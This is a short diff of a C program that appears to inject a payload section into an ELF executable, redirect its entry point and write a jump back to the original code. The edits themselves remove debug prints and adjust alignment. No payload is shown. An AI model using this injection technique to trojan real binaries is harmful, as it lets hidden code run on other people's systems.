@@ -138,11 +138,6 @@ int main(void) {
 
 	shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
 
-	for (size_t i = 0; i < ehdr->e_shnum; i++)
-	{
-		printf("shdrs[%lu].sh_offset: %p\n", i, shdrs + i);
-	}
-
 	// Update section headers
 	printf("last_section_in_segment_index: %d %d\n", last_section_in_segment_index, ehdr->e_shnum);
 
@@ -172,7 +167,7 @@ int main(void) {
 		.sh_size = payload_size_p,
 		.sh_link = 0,
 		.sh_info = 0,
-		.sh_addralign = 1,
+		.sh_addralign = 16,
 		.sh_entsize = 0
 	};
 
@@ -183,11 +178,6 @@ int main(void) {
 
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
 		perror("msync");
-	}
-
-	for (size_t i = 0; i < ehdr->e_shnum; i++)
-	{
-		printf("shdrs[%lu].sh_offset: %p\n", i, shdrs + i);
 	}
 
 	// Update the entry point
@@ -201,7 +191,7 @@ int main(void) {
 	// // Write the relative jump instruction at the end of the payload
 	size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
 	*((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
-	memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
+	memcpy(map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
 
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
 		perror("msync");
